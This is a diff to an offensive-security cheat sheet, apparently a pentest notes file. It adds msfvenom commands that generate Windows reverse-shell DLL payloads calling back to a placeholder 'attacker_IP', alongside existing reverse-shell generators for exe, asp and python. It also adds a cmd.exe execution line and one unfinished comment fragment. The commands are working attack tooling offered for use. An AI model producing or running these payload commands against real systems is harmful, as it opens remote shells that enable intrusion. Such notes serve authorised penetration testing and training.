@@ -2404,6 +2404,12 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f e
 # create Windows TCP reverse shell exe - 32-bit (unstaged)
 msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f exe -a x86 -o shell.exe
 
+# create Windows TCP reverse shell dll - 64-bit (unstaged)
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f dll -a x64 -o shell.dll
+
+# create Windows TCP reverse shell dll - 32-bit (unstaged)
+msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f dll -a x86 -o shell.dll
+
 # create Windows TCP reverse shell asp (unstaged)
 msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f asp -o revshell.asp
 
@@ -2435,6 +2441,8 @@ msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP_here LPORT=port_here -f 
 
 # create python reverse shell
 msfvenom -p python/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -o shell.py
+
+# create Windows TCP reverse shell dll - 
 ```
 
 
@@ -3308,6 +3316,7 @@ powershell -E content_of_outfile.ps1
 ```powershell
 # execute commands via cmd
 cmd.exe /c command_here
+C:\Windows\System32\cmd.exe /c command_here
 
 # print powershell version
 echo $PSVersionTable
